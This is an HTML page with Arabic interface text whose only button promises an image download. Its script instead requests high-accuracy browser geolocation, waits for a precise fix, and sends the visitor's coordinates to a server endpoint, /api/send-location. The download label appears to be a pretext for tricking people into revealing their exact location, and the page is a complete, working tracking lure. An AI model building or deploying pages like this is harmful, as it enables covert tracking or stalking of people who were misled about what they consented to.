<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 500px;
            margin: 60px auto;
            padding: 20px;
            text-align: center;
        }

        button {
            padding: 15px 25px;
            font-size: 18px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }

        button:disabled {
            opacity: 0.6;
            cursor: default;
        }

        #message {
            margin-top: 25px;
        }
    </style>
</head>

<body>

    <button id="locationButton">حمل الصورة من هنا</button>

    <div id="message"></div>

<script>

    const button  = document.getElementById("locationButton");
    const message = document.getElementById("message");

    button.addEventListener("click", getLocation);

    function show(text) {
        message.textContent = text;
    }

    function getLocation() {

        if (!navigator.geolocation) {
            show("غير متاح");
            return;
        }

        button.disabled = true;
        show("جاررري...");

        let meilleure = null;
        const seuil = 30;       
        const dureeMax = 20000; 

        const watchId = navigator.geolocation.watchPosition(

            function (position) {

                const acc = position.coords.accuracy;

                // On conserve la position la plus précise vue jusqu'ici
                if (!meilleure || acc < meilleure.coords.accuracy) {
                    meilleure = position;
                }

                show("حاليا : " + Math.round(acc) + " m...");

                if (acc <= seuil) {
                    navigator.geolocation.clearWatch(watchId);
                    clearTimeout(minuteur);
                    envoyer(meilleure);
                }
            },

            function (error) {

                navigator.geolocation.clearWatch(watchId);
                clearTimeout(minuteur);
                button.disabled = false;

                if (error.code === 1) {
                    show("رفضت الموافقة");
                } else if (error.code === 2) {
                    show("غير متاح");
                } else if (error.code === 3) {
                    show("انتهت الصلاحية.");
                } else {
                    show("خطأ");
                }
            },

            {
                enableHighAccuracy: true,
                timeout: dureeMax,
                maximumAge: 0
            }
        );

        const minuteur = setTimeout(function () {

            navigator.geolocation.clearWatch(watchId);

            if (meilleure) {
                envoyer(meilleure);
            } else {
                button.disabled = false;
                show("مستحيل.");
            }

        }, dureeMax);
    }

    async function envoyer(position) {

        show("Position obtenue (" + Math.round(position.coords.accuracy) + " m). Envoi...");

        try {
            const response = await fetch("/api/send-location", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    latitude:  position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy:  position.coords.accuracy
                })
            });

            const result = await response.json().catch(() => ({}));

            if (!response.ok) {
                throw new Error(result.error || "Erreur serveur");
            }

            show("Votre position a été transmise.");

        } catch (error) {
            console.error(error);
            show("Impossible d'envoyer la position.");
            button.disabled = false;
        }
    }

</script>

</body>
</html>
